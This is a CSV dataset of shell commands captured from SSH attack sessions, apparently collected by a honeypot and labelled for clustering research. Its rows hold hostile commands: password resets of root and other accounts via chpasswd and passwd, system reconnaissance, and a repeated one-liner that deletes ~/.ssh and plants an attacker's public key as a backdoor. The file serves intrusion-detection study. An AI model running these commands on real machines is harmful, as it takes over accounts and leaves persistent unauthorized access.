,session,command_freq,input,attack_cat,label_nr,label_desc,duration,SeededKmeans_result,Kmeans_results,PCKmeans_exp_result
17482,6e23bafeec60,15,"echo ""root:hcNUmNdBqZrF""|chpasswd|bash",Malicious activity,1,SSH attack,14.835287809371948,1,2,3
17483,6e23bafeec60,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,14.835287809371948,1,2,3
17484,6e23bafeec60,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,14.835287809371948,1,2,3
17485,6e23bafeec60,15,ls -lh $(which ls),Malicious activity,1,SSH attack,14.835287809371948,1,2,3
17486,6e23bafeec60,15,which ls,Malicious activity,1,SSH attack,14.835287809371948,1,2,3
17487,6e23bafeec60,15,crontab -l,Malicious activity,1,SSH attack,14.835287809371948,1,2,3
17488,6e23bafeec60,15,w,Malicious activity,1,SSH attack,14.835287809371948,1,2,3
17489,6e23bafeec60,15,uname -m,Malicious activity,1,SSH attack,14.835287809371948,1,2,3
17490,6e23bafeec60,15,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,14.835287809371948,1,2,3
17491,6e23bafeec60,15,top,Malicious activity,1,SSH attack,14.835287809371948,1,2,3
17492,6e23bafeec60,15,uname,Malicious activity,1,SSH attack,14.835287809371948,1,2,3
17493,6e23bafeec60,15,uname -a,Malicious activity,1,SSH attack,14.835287809371948,1,2,3
17494,6e23bafeec60,15,lscpu | grep Model,Malicious activity,1,SSH attack,14.835287809371948,1,2,3
17495,6e23bafeec60,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,14.835287809371948,1,2,3
17496,31b6a8eed7be,18,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,14.843875408172607,1,2,3
17497,31b6a8eed7be,18,"echo -e ""pko\n6Y7PHOYlkn4V\n6Y7PHOYlkn4V""|passwd|bash",Malicious activity,1,SSH attack,14.843875408172607,1,2,3
17498,31b6a8eed7be,18,Enter new UNIX password: ,Malicious activity,1,SSH attack,14.843875408172607,1,2,3
17499,31b6a8eed7be,18,Enter new UNIX password:,Malicious activity,1,SSH attack,14.843875408172607,1,2,3
17500,31b6a8eed7be,18,"echo ""pko\n6Y7PHOYlkn4V\n6Y7PHOYlkn4V\n""|passwd",Malicious activity,1,SSH attack,14.843875408172607,1,2,3
17501,31b6a8eed7be,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,14.843875408172607,1,2,3
17502,31b6a8eed7be,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,14.843875408172607,1,2,3
17503,31b6a8eed7be,18,ls -lh $(which ls),Malicious activity,1,SSH attack,14.843875408172607,1,2,3
17504,31b6a8eed7be,18,which ls,Malicious activity,1,SSH attack,14.843875408172607,1,2,3
17505,31b6a8eed7be,18,crontab -l,Malicious activity,1,SSH attack,14.843875408172607,1,2,3
17506,31b6a8eed7be,18,w,Malicious activity,1,SSH attack,14.843875408172607,1,2,3
17507,31b6a8eed7be,18,uname -m,Malicious activity,1,SSH attack,14.843875408172607,1,2,3
17508,31b6a8eed7be,18,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,14.843875408172607,1,2,3
17509,31b6a8eed7be,18,top,Malicious activity,1,SSH attack,14.843875408172607,1,2,3
17510,31b6a8eed7be,18,uname,Malicious activity,1,SSH attack,14.843875408172607,1,2,3
17511,31b6a8eed7be,18,uname -a,Malicious activity,1,SSH attack,14.843875408172607,1,2,3
17512,31b6a8eed7be,18,lscpu | grep Model,Malicious activity,1,SSH attack,14.843875408172607,1,2,3
17513,31b6a8eed7be,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,14.843875408172607,1,2,3
17514,e90ed2cfcef4,18,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,148.49391984939575,1,2,3
17515,e90ed2cfcef4,18,"echo -e ""P@$$w0rd\nB63zeBRtOBLH\nB63zeBRtOBLH""|passwd|bash",Malicious activity,1,SSH attack,148.49391984939575,1,2,3
17516,e90ed2cfcef4,18,Enter new UNIX password: ,Malicious activity,1,SSH attack,148.49391984939575,1,2,3
17517,e90ed2cfcef4,18,Enter new UNIX password:,Malicious activity,1,SSH attack,148.49391984939575,1,2,3
17518,e90ed2cfcef4,18,"echo ""P@$$w0rd\nB63zeBRtOBLH\nB63zeBRtOBLH\n""|passwd",Malicious activity,1,SSH attack,148.49391984939575,1,2,3
17519,e90ed2cfcef4,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,148.49391984939575,1,2,3
17520,e90ed2cfcef4,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,148.49391984939575,1,2,3
17521,e90ed2cfcef4,18,ls -lh $(which ls),Malicious activity,1,SSH attack,148.49391984939575,1,2,3
17522,e90ed2cfcef4,18,which ls,Malicious activity,1,SSH attack,148.49391984939575,1,2,3
17523,e90ed2cfcef4,18,crontab -l,Malicious activity,1,SSH attack,148.49391984939575,1,2,3
17524,e90ed2cfcef4,18,w,Malicious activity,1,SSH attack,148.49391984939575,1,2,3
17525,e90ed2cfcef4,18,uname -m,Malicious activity,1,SSH attack,148.49391984939575,1,2,3
17526,e90ed2cfcef4,18,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,148.49391984939575,1,2,3
17527,e90ed2cfcef4,18,top,Malicious activity,1,SSH attack,148.49391984939575,1,2,3
17528,e90ed2cfcef4,18,uname,Malicious activity,1,SSH attack,148.49391984939575,1,2,3
17529,e90ed2cfcef4,18,uname -a,Malicious activity,1,SSH attack,148.49391984939575,1,2,3
17530,e90ed2cfcef4,18,lscpu | grep Model,Malicious activity,1,SSH attack,148.49391984939575,1,2,3
17531,e90ed2cfcef4,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,148.49391984939575,1,2,3
17532,d567c9f82ee1,18,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,14.868122577667236,1,2,3
17533,d567c9f82ee1,18,"echo -e ""bananapi\n4zEnWUkrvGWY\n4zEnWUkrvGWY""|passwd|bash",Malicious activity,1,SSH attack,14.868122577667236,1,2,3
17534,d567c9f82ee1,18,Enter new UNIX password: ,Malicious activity,1,SSH attack,14.868122577667236,1,2,3
17535,d567c9f82ee1,18,Enter new UNIX password:,Malicious activity,1,SSH attack,14.868122577667236,1,2,3
17536,d567c9f82ee1,18,"echo ""bananapi\n4zEnWUkrvGWY\n4zEnWUkrvGWY\n""|passwd",Malicious activity,1,SSH attack,14.868122577667236,1,2,3
17537,d567c9f82ee1,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,14.868122577667236,1,2,3
17538,d567c9f82ee1,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,14.868122577667236,1,2,3
17539,d567c9f82ee1,18,ls -lh $(which ls),Malicious activity,1,SSH attack,14.868122577667236,1,2,3
17540,d567c9f82ee1,18,which ls,Malicious activity,1,SSH attack,14.868122577667236,1,2,3
17541,d567c9f82ee1,18,crontab -l,Malicious activity,1,SSH attack,14.868122577667236,1,2,3
17542,d567c9f82ee1,18,w,Malicious activity,1,SSH attack,14.868122577667236,1,2,3
17543,d567c9f82ee1,18,uname -m,Malicious activity,1,SSH attack,14.868122577667236,1,2,3
17544,d567c9f82ee1,18,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,14.868122577667236,1,2,3
17545,d567c9f82ee1,18,top,Malicious activity,1,SSH attack,14.868122577667236,1,2,3
17546,d567c9f82ee1,18,uname,Malicious activity,1,SSH attack,14.868122577667236,1,2,3
17547,d567c9f82ee1,18,uname -a,Malicious activity,1,SSH attack,14.868122577667236,1,2,3
17548,d567c9f82ee1,18,lscpu | grep Model,Malicious activity,1,SSH attack,14.868122577667236,1,2,3
17549,d567c9f82ee1,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,14.868122577667236,1,2,3
17550,e86e601060fc,15,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,14.880246639251707,1,2,3
17551,e86e601060fc,15,"echo ""root:8wFxk6Ek2ZxL""|chpasswd|bash",Malicious activity,1,SSH attack,14.880246639251707,1,2,3
17552,e86e601060fc,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,14.880246639251707,1,2,3
17553,e86e601060fc,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,14.880246639251707,1,2,3
17554,e86e601060fc,15,ls -lh $(which ls),Malicious activity,1,SSH attack,14.880246639251707,1,2,3
17555,e86e601060fc,15,which ls,Malicious activity,1,SSH attack,14.880246639251707,1,2,3
17556,e86e601060fc,15,crontab -l,Malicious activity,1,SSH attack,14.880246639251707,1,2,3
17557,e86e601060fc,15,w,Malicious activity,1,SSH attack,14.880246639251707,1,2,3
17558,e86e601060fc,15,uname -m,Malicious activity,1,SSH attack,14.880246639251707,1,2,3
17559,e86e601060fc,15,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,14.880246639251707,1,2,3
17560,e86e601060fc,15,top,Malicious activity,1,SSH attack,14.880246639251707,1,2,3
17561,e86e601060fc,15,uname,Malicious activity,1,SSH attack,14.880246639251707,1,2,3
17562,e86e601060fc,15,uname -a,Malicious activity,1,SSH attack,14.880246639251707,1,2,3
17563,e86e601060fc,15,lscpu | grep Model,Malicious activity,1,SSH attack,14.880246639251707,1,2,3
17564,e86e601060fc,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,14.880246639251707,1,2,3
17565,3791dc79bd1e,15,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,148.85721564292908,1,2,3
17566,3791dc79bd1e,15,"echo ""root:ce3Kr5ogXhop""|chpasswd|bash",Malicious activity,1,SSH attack,148.85721564292908,1,2,3
17567,3791dc79bd1e,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,148.85721564292908,1,2,3
17568,3791dc79bd1e,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,148.85721564292908,1,2,3
17569,3791dc79bd1e,15,ls -lh $(which ls),Malicious activity,1,SSH attack,148.85721564292908,1,2,3
17570,3791dc79bd1e,15,which ls,Malicious activity,1,SSH attack,148.85721564292908,1,2,3
17571,3791dc79bd1e,15,crontab -l,Malicious activity,1,SSH attack,148.85721564292908,1,2,3
17572,3791dc79bd1e,15,w,Malicious activity,1,SSH attack,148.85721564292908,1,2,3
17573,3791dc79bd1e,15,uname -m,Malicious activity,1,SSH attack,148.85721564292908,1,2,3
17574,3791dc79bd1e,15,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,148.85721564292908,1,2,3
17575,3791dc79bd1e,15,top,Malicious activity,1,SSH attack,148.85721564292908,1,2,3
17576,3791dc79bd1e,15,uname,Malicious activity,1,SSH attack,148.85721564292908,1,2,3
17577,3791dc79bd1e,15,uname -a,Malicious activity,1,SSH attack,148.85721564292908,1,2,3
17578,3791dc79bd1e,15,lscpu | grep Model,Malicious activity,1,SSH attack,148.85721564292908,1,2,3
17579,3791dc79bd1e,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,148.85721564292908,1,2,3
17580,2692ef8ed96c,15,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,14.890000581741331,1,2,3
17581,2692ef8ed96c,15,"echo ""root:RW0oz1BMltYl""|chpasswd|bash",Malicious activity,1,SSH attack,14.890000581741331,1,2,3
17582,2692ef8ed96c,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,14.890000581741331,1,2,3
17583,2692ef8ed96c,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,14.890000581741331,1,2,3
17584,2692ef8ed96c,15,ls -lh $(which ls),Malicious activity,1,SSH attack,14.890000581741331,1,2,3
17585,2692ef8ed96c,15,which ls,Malicious activity,1,SSH attack,14.890000581741331,1,2,3
17586,2692ef8ed96c,15,crontab -l,Malicious activity,1,SSH attack,14.890000581741331,1,2,3
17587,2692ef8ed96c,15,w,Malicious activity,1,SSH attack,14.890000581741331,1,2,3
17588,2692ef8ed96c,15,uname -m,Malicious activity,1,SSH attack,14.890000581741331,1,2,3
17589,2692ef8ed96c,15,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,14.890000581741331,1,2,3
17590,2692ef8ed96c,15,top,Malicious activity,1,SSH attack,14.890000581741331,1,2,3
17591,2692ef8ed96c,15,uname,Malicious activity,1,SSH attack,14.890000581741331,1,2,3
17592,2692ef8ed96c,15,uname -a,Malicious activity,1,SSH attack,14.890000581741331,1,2,3
17593,2692ef8ed96c,15,lscpu | grep Model,Malicious activity,1,SSH attack,14.890000581741331,1,2,3
17594,2692ef8ed96c,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,14.890000581741331,1,2,3
17595,3fe6e88ccbc2,18,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,14.927234411239624,1,2,3
17596,3fe6e88ccbc2,18,"echo -e ""night123\nrW5BKZwI01Ba\nrW5BKZwI01Ba""|passwd|bash",Malicious activity,1,SSH attack,14.927234411239624,1,2,3
17597,3fe6e88ccbc2,18,Enter new UNIX password: ,Malicious activity,1,SSH attack,14.927234411239624,1,2,3
17598,3fe6e88ccbc2,18,Enter new UNIX password:,Malicious activity,1,SSH attack,14.927234411239624,1,2,3
17599,3fe6e88ccbc2,18,"echo ""night123\nrW5BKZwI01Ba\nrW5BKZwI01Ba\n""|passwd",Malicious activity,1,SSH attack,14.927234411239624,1,2,3
17600,3fe6e88ccbc2,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,14.927234411239624,1,2,3
17601,3fe6e88ccbc2,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,14.927234411239624,1,2,3
17602,3fe6e88ccbc2,18,ls -lh $(which ls),Malicious activity,1,SSH attack,14.927234411239624,1,2,3
17603,3fe6e88ccbc2,18,which ls,Malicious activity,1,SSH attack,14.927234411239624,1,2,3
17604,3fe6e88ccbc2,18,crontab -l,Malicious activity,1,SSH attack,14.927234411239624,1,2,3
17605,3fe6e88ccbc2,18,w,Malicious activity,1,SSH attack,14.927234411239624,1,2,3
17606,3fe6e88ccbc2,18,uname -m,Malicious activity,1,SSH attack,14.927234411239624,1,2,3
17607,3fe6e88ccbc2,18,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,14.927234411239624,1,2,3
17608,3fe6e88ccbc2,18,top,Malicious activity,1,SSH attack,14.927234411239624,1,2,3
17609,3fe6e88ccbc2,18,uname,Malicious activity,1,SSH attack,14.927234411239624,1,2,3
17610,3fe6e88ccbc2,18,uname -a,Malicious activity,1,SSH attack,14.927234411239624,1,2,3
17611,3fe6e88ccbc2,18,lscpu | grep Model,Malicious activity,1,SSH attack,14.927234411239624,1,2,3
17612,3fe6e88ccbc2,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,14.927234411239624,1,2,3
17613,208d0c405d16,18,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,14.986214399337769,1,2,3
17614,208d0c405d16,18,"echo -e ""admin123\nEOInwZc5rIaF\nEOInwZc5rIaF""|passwd|bash",Malicious activity,1,SSH attack,14.986214399337769,1,2,3
17615,208d0c405d16,18,Enter new UNIX password: ,Malicious activity,1,SSH attack,14.986214399337769,1,2,3
17616,208d0c405d16,18,Enter new UNIX password:,Malicious activity,1,SSH attack,14.986214399337769,1,2,3
17617,208d0c405d16,18,"echo ""admin123\nEOInwZc5rIaF\nEOInwZc5rIaF\n""|passwd",Malicious activity,1,SSH attack,14.986214399337769,1,2,3
17618,208d0c405d16,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,14.986214399337769,1,2,3
17619,208d0c405d16,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,14.986214399337769,1,2,3
17620,208d0c405d16,18,ls -lh $(which ls),Malicious activity,1,SSH attack,14.986214399337769,1,2,3
17621,208d0c405d16,18,which ls,Malicious activity,1,SSH attack,14.986214399337769,1,2,3
17622,208d0c405d16,18,crontab -l,Malicious activity,1,SSH attack,14.986214399337769,1,2,3
17623,208d0c405d16,18,w,Malicious activity,1,SSH attack,14.986214399337769,1,2,3
17624,208d0c405d16,18,uname -m,Malicious activity,1,SSH attack,14.986214399337769,1,2,3
17625,208d0c405d16,18,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,14.986214399337769,1,2,3
17626,208d0c405d16,18,top,Malicious activity,1,SSH attack,14.986214399337769,1,2,3
17627,208d0c405d16,18,uname,Malicious activity,1,SSH attack,14.986214399337769,1,2,3
17628,208d0c405d16,18,uname -a,Malicious activity,1,SSH attack,14.986214399337769,1,2,3
17629,208d0c405d16,18,lscpu | grep Model,Malicious activity,1,SSH attack,14.986214399337769,1,2,3
17630,208d0c405d16,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,14.986214399337769,1,2,3
17631,c5583a45bf51,15,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,15.022452116012571,1,2,3
17632,c5583a45bf51,15,"echo ""root:A5HV9Ccql4ly""|chpasswd|bash",Malicious activity,1,SSH attack,15.022452116012571,1,2,3
17633,c5583a45bf51,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,15.022452116012571,1,2,3
17634,c5583a45bf51,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,15.022452116012571,1,2,3
17635,c5583a45bf51,15,ls -lh $(which ls),Malicious activity,1,SSH attack,15.022452116012571,1,2,3
17636,c5583a45bf51,15,which ls,Malicious activity,1,SSH attack,15.022452116012571,1,2,3
17637,c5583a45bf51,15,crontab -l,Malicious activity,1,SSH attack,15.022452116012571,1,2,3
17638,c5583a45bf51,15,w,Malicious activity,1,SSH attack,15.022452116012571,1,2,3
17639,c5583a45bf51,15,uname -m,Malicious activity,1,SSH attack,15.022452116012571,1,2,3
17640,c5583a45bf51,15,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,15.022452116012571,1,2,3
17641,c5583a45bf51,15,top,Malicious activity,1,SSH attack,15.022452116012571,1,2,3
17642,c5583a45bf51,15,uname,Malicious activity,1,SSH attack,15.022452116012571,1,2,3
17643,c5583a45bf51,15,uname -a,Malicious activity,1,SSH attack,15.022452116012571,1,2,3
17644,c5583a45bf51,15,lscpu | grep Model,Malicious activity,1,SSH attack,15.022452116012571,1,2,3
